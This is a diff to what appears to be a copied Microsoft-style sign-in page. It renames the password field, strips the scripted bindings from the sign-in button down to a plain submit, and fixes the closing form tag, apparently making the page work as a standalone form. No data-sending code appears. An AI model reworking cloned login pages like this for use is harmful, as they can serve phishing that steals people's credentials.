@@ -47,6 +47,7 @@
 
 <div data-bind="if: activeDialog"></div>
 
+
     <!-- ko withProperties: { '$loginPage': $data } -->
     <div class="login-paginated-page" data-bind="component: { name: 'master-page',
         publicMethods: masterPageMethods,
@@ -220,7 +221,9 @@
             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
         
             <!-- ko if: $parent.currentViewIndex() === $index() -->
-                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
+                <!-- ko template: { nodes: [$data], data: $parent } -->
+                
+                <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                 params: {
                     serverData: svr,
                     serverError: initialError,
@@ -293,7 +296,7 @@
                 updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
     <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
 
-            <input name="passwd" type="password" id="i0118" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
+            <input name="password" type="password" id="i0118" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                 attr: { autocomplete: svr.fIsUpdatedAutocompleteEnabled ? 'current-password' : 'off'},
                 textInput: passwordTextbox.value,
                 ariaDescribedBy: [
@@ -399,26 +402,14 @@
     <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
         <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
         <!-- ko ifnot: svr.fConsentButtonIdViaName -->
-        <input type="submit" id="idSIButton9" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
-                attr: primaryButtonAttributes,
-                css: { 'high-contrast-overrides': svr.fUseHighContrastDetectionMode },
-                externalCss: {
-                    'button': true,
-                    'primary': true },
-                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
-                hasFocus: focusOnPrimaryButton,
-                click: svr.fEnableLivePreview ?  function() { } : primaryButton_onClick,
-                clickBubble: !svr.fEnableLivePreview,
-                enable: isPrimaryButtonEnabled,
-                visible: isPrimaryButtonVisible,
-                preventTabbing: primaryButtonPreventTabbing" value="Sign in" data-report-attached="1">
+        <input type="submit" id="idSIButton9" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" value="Sign in" tabindex="2">
         <!-- /ko -->
         <!-- ko if: svr.fConsentButtonIdViaName --><!-- /ko -->
     </div>
 </div></div>
     </div>
 </div>
-</form
+</form>
 
 <!-- ko if: tenantBranding.BoilerPlateText || boilerPlateText-->
 <div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" data-bind="
